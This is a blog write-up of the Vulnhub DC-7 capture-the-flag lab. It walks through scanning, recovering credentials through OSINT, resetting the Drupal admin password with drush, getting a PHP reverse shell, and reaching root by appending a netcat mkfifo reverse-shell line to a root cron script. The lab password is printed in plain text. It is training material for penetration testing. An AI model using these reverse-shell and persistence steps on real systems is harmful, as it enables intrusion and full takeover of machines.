---
"title": "Vulnhub - DC 7"
"date": 2019-11-23
"tags": ["medium", "drupal", "cron"]
"keywords": ["medium", "drupal", "cron"]
"categories": ["Vulnhub"]
"author": "Ghostbyt3"
"description": "Today, We are going to pwn DC 7 by DCAU7 from Vulnhub"
"featured_image": "/img/dc7/1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "Vulnhub - Writeup"
---


![Untitled](/img/dc7/1.png)
Today, We are going to pwn DC 7 by DCAU7 from Vulnhub


## Description
>DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.
While this isn't an overly technical challenge, it isn't exactly easy.
While it's kind of a logical progression from an earlier DC release (I won't tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won't succeed.
What you will need to do, is to think "outside" of the box.
Waaaaaay "outside" of the box. :-)
The ultimate goal of this challenge is to get root and to read the one and only flag.
Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

Download Link : [https://www.vulnhub.com/entry/dc-7,356/](https://www.vulnhub.com/entry/dc-7,356/)

Lets Begin with our Initial Scan

## Nmap Scan Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)
|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)
|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: Drupal 8 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Welcome to DC-7 | D7
MAC Address: 08:00:27:6F:D5:25 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looks like there is a HTTP port is open so lets start our Gobuster

## Gobuster Result
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.12
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/29 18:24:01 Starting gobuster
===============================================================
/.config (Status: 403)
/.cvs (Status: 403)
/.bash_history (Status: 403)
/.hta (Status: 403)
/.cache (Status: 403)
/.git/HEAD (Status: 403)
/.bashrc (Status: 403)
/.forward (Status: 403)
/.cvsignore (Status: 403)
/.passwd (Status: 403)
/.profile (Status: 403)
/.perf (Status: 403)
/.rhosts (Status: 403)
/.mysql_history (Status: 403)
/.listings (Status: 403)
/.sh_history (Status: 403)
/.ssh (Status: 403)
/.svn (Status: 403)
/.subversion (Status: 403)
/.history (Status: 403)
/.htaccess (Status: 403)
/.web (Status: 403)
/.swf (Status: 403)
/.listing (Status: 403)
/.htpasswd (Status: 403)
/.svn/entries (Status: 403)
/Admin (Status: 403)
/admin (Status: 403)
/ADMIN (Status: 403)
/batch (Status: 403)
/core (Status: 301)
/Entries (Status: 403)
/index.php (Status: 200)
/install.mysql (Status: 403)
/install.pgsql (Status: 403)
/modules (Status: 301)
/node (Status: 200)
/profiles (Status: 301)
/robots.txt (Status: 200)
/Root (Status: 403)
/search (Status: 302)
/Search (Status: 302)
/server-status (Status: 403)
/sites (Status: 301)
/themes (Status: 301)
/user (Status: 302)
/vendor (Status: 403)
/web.config (Status: 200)
===============================================================
2019/11/29 18:27:52 Finished
===============================================================
```

## OSINT 

While checking the webpage it is a ``Drupal CMS`` which is one of the well know CMS.
![Untitled](/img/dc7/1.png)

Cant find anything useful on the pages but ``Think outside the box`` It looks like an hint.
At the end of the page it looks like an username[br/](br/)

![Untitled](/img/dc7/2.png)

Mostly this ```@``` use in social medias so i searched for the user and found an account on twitter.[br/](br/)
![Untitled](/img/dc7/3.png)

And there is a github link
>https://github.com/Dc7User/

## Getting User Credentials

While checking the repo found some credentials.
![Untitled](/img/dc7/4.png)

I tried login in drupal but cant so i tried in ssh.
>dc7user:MdR3xOgB7#dW

![Untitled](/img/dc7/5.png)

And it worked!!

First is first I checked the home directory and found there is a script running.[br/](br/)
![Untitled](/img/dc7/6.png)

Inside ``backup.sh`` I found ``drush`` which is drupal shell

![Untitled](/img/dc7/8.png)

And the script running as root and www-data so , If we became ``www-data`` and we can get reverse shell using ``backup.sh`` and we can get ``root``.

![Untitled](/img/dc7/7.png)

Since drush is there I googled for drush commands and found 
>https://drushcommands.com/drush-7x/user/user-password/

> drush user-password admin ---password=admin

## Getting Shell as www-data

We successfully logged in with new password ``admin:admin``[br/](br/)
![Untitled](/img/dc7/9.png)

Now its time to get reverse shell and found we can upload modules in ``Extend Tab``[br/](br/)
![Untitled](/img/dc7/10.png)

I found this 
>[https://www.drupal.org/project/php](https://www.drupal.org/project/php)

I clicked on the Install new module button and uploaded this!

![Untitled](/img/dc7/11.png)

After checking its enabled I went to ``Content -> Add content -> basic page`` and then select the ``Text format`` to be PHP code and copy paste the reverse shell code.

![Untitled](/img/dc7/12.png)

Clicking Preview while the listener is running i got the shell and we are ```www-data```
![Untitled](/img/dc7/13.png)


## Privilege Escalation

We already know that the script is running as root and www-data so we can add our reverse shell to get root

``` echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.18 4444 >/tmp/f" >> backups.sh ```

![Untitled](/img/dc7/14.png)

Wait for sometime because cron is running!

![Untitled](/img/dc7/15.png)

We got Root !!












